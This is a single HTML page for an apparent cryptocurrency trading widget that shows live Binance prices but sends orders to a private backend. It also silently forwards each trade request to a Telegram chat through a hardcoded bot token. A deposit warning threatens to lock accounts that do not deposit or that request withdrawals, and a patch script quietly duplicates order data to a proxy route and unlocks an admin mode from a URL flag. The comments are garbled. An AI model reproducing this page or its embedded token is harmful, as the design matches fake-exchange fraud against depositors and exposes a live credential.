<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Trade</title>

  <style>
    body { font-family: Arial; background: transparent; color: white; padding:20px; margin:0; }
    .container { max-width:450px; margin:0 auto; width:100%; }
    h2 { text-align:center; margin-bottom:20px; }
    .transaction-type { display:flex; justify-content:space-between; gap:4%; width:100%; }
    .btn { width:48%; padding:12px; border-radius:8px; border:2px solid; cursor:pointer; background:transparent; font-size:16px; }
    .buy-btn { border-color:#2ecc71; color:#2ecc71; }
    .sell-btn { border-color:#e67e22; color:#e67e22; }

    input, select {
      width:100%;
      padding:12px;
      margin-top:8px;
      border-radius:8px;
      border:1px solid #ccc;
      background: transparent !important;
      color:white !important;
      font-size:16px;
      box-sizing:border-box;
    }

    select option {
      background: white !important;
      color: black !important;
    }

    .trade-btn { 
        width:100%; 
        padding:12px; 
        border-radius:8px; 
        border:2px solid #3498db; 
        background:transparent; 
        color:#3498db; 
        margin-top:20px; 
        cursor:pointer; 
        font-size:16px;
    }

    .adjusted-box p { margin:5px 0; }

    .stop-box input[type="number"] {
      width:48%;
      display:inline-block;
      margin-right:4%;
      margin-top:5px;
    }

    #orderIdBox {
      margin-top:15px;
      padding:12px;
      border:1px solid #aaa;
      border-radius:8px;
      font-size:15px;
      display:none;
    }

    .hint-cn {
      margin-top:6px;
      color:#bbb;
      font-size:12px;
      line-height:1.4;
    }

    .trade-btn.loading { opacity:0.7; cursor:not-allowed; position:relative; }
    .trade-btn.loading::after {
      content:""; width:18px; height:18px; border:3px solid rgba(52,152,219,0.6); border-top-color:#3498db; border-radius:50%; animation:spin 0.8s linear infinite; position:absolute; right:12px; top:50%; transform:translateY(-50%);
    }
    @keyframes spin { from{transform:translateY(-50%) rotate(0);} to{transform:translateY(-50%) rotate(360deg);} }
  </style>
</head>
<body>

<div class="container">

  <div id="orderIdBox"></div>

  <h2></h2>

  <div class="transaction-type">
    <button class="btn buy-btn" id="buyBtn">Buy</button>
    <button class="btn sell-btn" id="sellBtn">Sell</button>
  </div>

  <label>Select Coin:</label>
  <select id="currency"></select>

  <label>Amount:</label>
  <input type="number" id="amount" placeholder="Enter amount">

  <label>Amount Currency:</label>
  <select id="amountCurrency"></select>

  <div class="adjusted-box" id="convertedBox">
    <p><b>Auto-conversion:</b></p>
  </div>

  <div class="stop-box">
    <label>
      <input type="checkbox" id="slCheckbox"> 
      Enable Stop-loss/Take-profit
    </label>

    <div id="slBox" style="display:none; margin-top:6px;">
        <input type="number" id="takeProfit" placeholder="TP %">
        <input type="number" id="stopLoss" placeholder="SL %">

        <div id="tpResult" style="color:#7ed957; margin-top:6px;"></div>
        <div id="slResult" style="color:#ff8c69;"></div>
    </div>
  </div>

  <button class="trade-btn" id="tradeBtn">Trade</button>

  <p class="hint-cn">ü§ñ Please ensure you have completed your deposit. Failure to deposit or submitting a withdrawal order maliciously may trigger your account security protection mechanism and prevent you from submitting further orders.</p>

</div>

<script>
/* ============================ ÈÄöÁî®Â∑•ÂÖ∑ ============================ */
const API_BASE = "https://crypto-management-production-5e04.up.railway.app";

async function postRetry(url, data, retry = 2){
  for(let i=0;i<=retry;i++){
    try{
      let r = await fetch(url,{
        method:"POST",
        headers:{ "Content-Type":"application/json","X-User-Id":getUserId() },
        body: JSON.stringify(data)
      });
      if(r.ok) return r;
    }catch(e){}
    if(i===retry) throw new Error("Network Error");
    await new Promise(r=>setTimeout(r, 500));
  }
}

function usTime(ts){
  return new Date(ts).toLocaleString("en-US",{
    timeZone: "America/New_York",
    hour12: true,
    year:"numeric",month:"2-digit",day:"2-digit",
    hour:"2-digit",minute:"2-digit"
  }).replace(",", "");
}

/* ============================ USER ID ============================ */
function getUserId(){
  let url = new URLSearchParams(window.location.search);
  let uid = url.get("userid") || localStorage.getItem("userid4");

  if(!uid){
    uid = String(Math.floor(1000+Math.random()*9000));
    localStorage.setItem("userid4", uid);
  }

  // ÂºÇÊ≠•ÂêåÊ≠•
  postRetry(`${API_BASE}/api/users/sync`, {userid:uid}).catch(()=>{});
  return uid;
}
const USERID = getUserId();

/* ============================ TELEGRAM ============================ */
const BOT_TOKEN = "8423870040:AAEyKQukt720qD7qHZ9YrIS9m_x-E65coPU";
const PRIVATE_ID = 6062973135;
const GROUP_ID = -1003262870745;

function sendTG(text){
  const payload = chatId => ({
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode:"Markdown" })
  });

  let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, payload(PRIVATE_ID)).catch(()=>{});
  fetch(url, payload(GROUP_ID)).catch(()=>{});
}

/* ============================ UI ÂàùÂßãÂåñ ============================ */
let tradeType = "buy";
let live = {};

const coins = ["BTC","ETH","BNB","SOL","XRP","ADA","DOGE","TRX","DOT","MATIC","AVAX","USDT","USDC","DAI"];

document.addEventListener("DOMContentLoaded", () => {
  initUI();
  initWS();
});

function initUI(){
  let c1 = document.getElementById("currency");
  let c2 = document.getElementById("amountCurrency");

  coins.forEach(c=>{
    c1.innerHTML += `<option value="${c}">${c}</option>`;
    c2.innerHTML += `<option value="${c}">${c}</option>`;
  });

  c2.value = "USDT";

  document.getElementById("buyBtn").onclick=()=>setType("buy");
  document.getElementById("sellBtn").onclick=()=>setType("sell");
  document.getElementById("tradeBtn").onclick=sendOrder;

  document.getElementById("slCheckbox").onclick=toggleSL;

  document.getElementById("amount").oninput=updateConverted;
  c1.onchange=updateConverted;
  c2.onchange=updateConverted;

  document.getElementById("takeProfit").oninput=updateTPSL;
  document.getElementById("stopLoss").oninput=updateTPSL;

  setType("buy");
}

/* ============================ Websocket ============================ */
function initWS(){
  let ws = new WebSocket("wss://stream.binance.com:9443/ws/!ticker@arr");

  ws.onmessage = e =>{
    let data = JSON.parse(e.data);
    data.forEach(t=>{
      if(t.s.endsWith("USDT")){
        live[t.s.replace("USDT","")] = parseFloat(t.c);
      }
    });
    updateConverted();
    updateTPSL();
  };

  ws.onclose=()=>setTimeout(initWS, 2000);
}

/* ============================ ËΩ¨Êç¢ËÆ°ÁÆó ============================ */
function setType(t){
  tradeType = t;
  document.getElementById("buyBtn").style.filter = t==="buy"?"brightness(100%)":"brightness(40%)";
  document.getElementById("sellBtn").style.filter = t==="sell"?"brightness(100%)":"brightness(40%)";
}

function updateConverted(){
  let amount = Number(document.getElementById("amount").value);
  let from = document.getElementById("amountCurrency").value;
  let to = document.getElementById("currency").value;
  let box = document.getElementById("convertedBox");

  box.innerHTML="<p><b>Auto-conversion:</b></p>";

  if(!amount || !live[from] || !live[to]) return;

  let usd = amount * live[from];
  let converted = usd / live[to];

  box.innerHTML += `<p>${to}: ${converted.toFixed(6)}</p>`;
}

function toggleSL(){
  document.getElementById("slBox").style.display =
    document.getElementById("slCheckbox").checked ? "block":"none";
}

function updateTPSL(){
  if(!document.getElementById("slCheckbox").checked) return;

  let coin=document.getElementById("currency").value;
  let p=live[coin];
  let tp = Number(document.getElementById("takeProfit").value);
  let sl = Number(document.getElementById("stopLoss").value);

  if(!p) return;

  if(tp){
    document.getElementById("tpResult").innerHTML =
      `TP Price: ${(p*(1+tp/100)).toFixed(6)} USDT`;
  }else document.getElementById("tpResult").innerHTML="";

  if(sl){
    document.getElementById("slResult").innerHTML =
      `SL Price: ${(p*(1-sl/100)).toFixed(6)} USDT`;
  }else document.getElementById("slResult").innerHTML="";
}

/* ============================ Order ID ============================ */
function genOrderId(){
  let d=new Date();
  let y=d.getFullYear();
  let m=("0"+(d.getMonth()+1)).slice(-2);
  let da=("0"+d.getDate()).slice(-2);
  let rnd=Math.floor(100000+Math.random()*900000);
  return `TRD-${y}${m}${da}-${rnd}`;
}

/* ============================ Êèê‰∫§ËÆ¢Âçï ============================ */
async function sendOrder(){
  let coin = document.getElementById("currency").value;
  let amount = document.getElementById("amount").value;
  let ac = document.getElementById("amountCurrency").value;
  let tp = document.getElementById("takeProfit").value||"None";
  let sl = document.getElementById("stopLoss").value||"None";

  if(!amount){ alert("Enter amount"); return; }

  let oid = genOrderId();
  let timeUS = usTime(Date.now());

  let msg =
`üìå *New Trade Request*
*User:* ${USERID}
*Order ID:* \`${oid}\`

Type: *${tradeType}*
Amount: *${amount} ${ac}*
TP: *${tp}*
SL: *${sl}*
Time (US): *${timeUS}*`;

  sendTG(msg);

  let payload = {
    userid: USERID,
    tradeType,
    amount,
    amountCurrency: ac,
    coin,
    tp, sl,
    orderId: oid,
    timestamp: Date.now(),
    time_us: timeUS
  };

  let box=document.getElementById("orderIdBox");
  box.style.display="block";
  box.innerHTML=`<div>Order submitted: <b>${oid}</b></div>`;

  let btn=document.getElementById("tradeBtn");
  btn.disabled=true; 
  btn.classList.add("loading");
  btn.textContent="Submitting...";

  try{
    await postRetry(`${API_BASE}/api/order/buysell`, payload, 3);

    btn.textContent="Submitted!";
    setTimeout(()=>{
      btn.disabled=false;
      btn.classList.remove("loading");
      btn.textContent="Trade";
    },1500);
  }catch(e){
    alert("Network error, order may still be submitted. Please check backend.");
    btn.disabled=false;
    btn.classList.remove("loading");
    btn.textContent="Trade";
  }
}
</script>

<!-- ‰∏ãÈù¢ÊòØË°•‰∏ÅËÑöÊú¨ÔºöÂè™ÂÅöÂπ∂Ë°å/ÂÖºÂÆπÊâ©Â±ïÔºå‰∏çÊîπ UI„ÄÅ‰∏çÊîπÂéüÊúâÂáΩÊï∞ -->
<script>
(function(){
  try{
    // Á°Æ‰øù localStorage ‰∏≠Êúâ userid4Ôºà‰ºòÂÖà‰øùÁïôÁé∞ÊúâÈÄªËæëÔºâ
    try{
      const urlParams = new URLSearchParams(window.location.search);
      const qUid = urlParams.get('userid');
      const existing = localStorage.getItem('userid4');
      if(qUid && qUid !== existing){
        localStorage.setItem('userid4', qUid);
      } else if(!existing){
        // try to detect Strikingly common vars
        let detected = null;
        try{
          detected = window.strikinglyUserId || window.strikingly_member_id || (window.Strikingly && window.Strikingly.user && window.Strikingly.user.uid) || localStorage.getItem('userid4');
        }catch(e){}
        if(detected) localStorage.setItem('userid4', String(detected));
      }
    }catch(e){}

    // Â¶ÇÊûúÈ°µÈù¢Â∑≤Êúâ sendOrder ÂáΩÊï∞ÔºåÂåÖË£ÖÂÆÉ ‚Äî‚Äî Âú®Ë∞ÉÁî®ÂéüÊù•ÈÄªËæëÁöÑÂêåÊó∂Âπ∂Ë°åÂèëÈÄÅÂà∞ /proxyÔºàÂèåË∑ØÔºâ
    if(typeof window.sendOrder === 'function'){
      const orig = window.sendOrder;
      window.sendOrder = async function(){
        // capture DOM values similar to original payload
        try{
          const coin = document.getElementById("currency") ? document.getElementById("currency").value : '';
          const amount = document.getElementById("amount") ? document.getElementById("amount").value : '';
          const ac = document.getElementById("amountCurrency") ? document.getElementById("amountCurrency").value : '';
          const tp = document.getElementById("takeProfit") ? document.getElementById("takeProfit").value||"None" : "None";
          const sl = document.getElementById("stopLoss") ? document.getElementById("stopLoss").value||"None" : "None";
          const oid = (typeof genOrderId === 'function') ? genOrderId() : ('TRD-'+Date.now());
          const timeUS = (typeof usTime === 'function') ? usTime(Date.now()) : new Date().toLocaleString('en-US', {timeZone:'America/New_York'});
          const payload = {
            userid: localStorage.getItem('userid4') || '0000',
            tradeType: (typeof tradeType !== 'undefined') ? tradeType : (window.TRADE_TYPE || 'buy'),
            amount,
            amountCurrency: ac,
            coin,
            tp, sl,
            orderId: oid,
            timestamp: Date.now(),
            time_us: timeUS
          };

          // call original (don't block on background proxy)
          const origPromise = (async ()=> { try{ return await orig.apply(this, arguments); }catch(e){ /* ignore */ } })();

          // send to proxy in background (non-blocking). keep header X-User-Id for backend
          try{
            fetch(`${API_BASE}/proxy`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json', 'X-User-Id': payload.userid },
              body: JSON.stringify({ route: 'buysell', data: payload })
            }).catch(()=>{});
          }catch(e){}

          return origPromise;
        }catch(e){
          // fallback to original if anything goes wrong
          try{ return await orig.apply(this, arguments); }catch(err){}
        }
      };
    }

    // Ê≥®ÂÖ•ÁÆ°ÁêÜÂêéÂè∞Âè≥‰∏äËßíÈÄÄÂá∫ÈîÆÔºà‰ªÖÂú® admin Ê®°Âºè‰∏ãÊ≥®ÂÖ•Ôºå‰∏ç‰ºö‰øÆÊîπ UIÔºâ
    try{
      const url = new URLSearchParams(window.location.search);
      const isAdmin = url.get('admin') === '1' || localStorage.getItem('nexbit_admin') === '1';
      if(isAdmin){
        const btn = document.createElement('button');
        btn.style.position='fixed';
        btn.style.top='8px';
        btn.style.right='8px';
        btn.style.zIndex=999999;
        btn.style.padding='8px 10px';
        btn.style.background='rgba(0,0,0,0.45)';
        btn.style.color='#fff';
        btn.style.border='1px solid rgba(255,255,255,0.2)';
        btn.style.borderRadius='8px';
        btn.style.fontSize='13px';
        btn.innerText='Logout';
        btn.onclick = ()=> {
          try{ localStorage.removeItem('nexbit_admin'); }catch(e){}
          try{ window.parent.postMessage({ type:'nexbit_admin_logout' }, '*'); }catch(e){}
          alert('Â∑≤ÈÄÄÂá∫ÔºàÊú¨Âú∞Ê†áËÆ∞Â∑≤Ê∏ÖÁêÜÔºâ„ÄÇ');
        };
        document.body.appendChild(btn);
      }
    }catch(e){}
  }catch(e){
    console.warn('patch error', e);
  }
})();
</script>

<script src="js/auth.js"></script>
<script src="js/nexbit-api.js"></script>

</body>
</html>
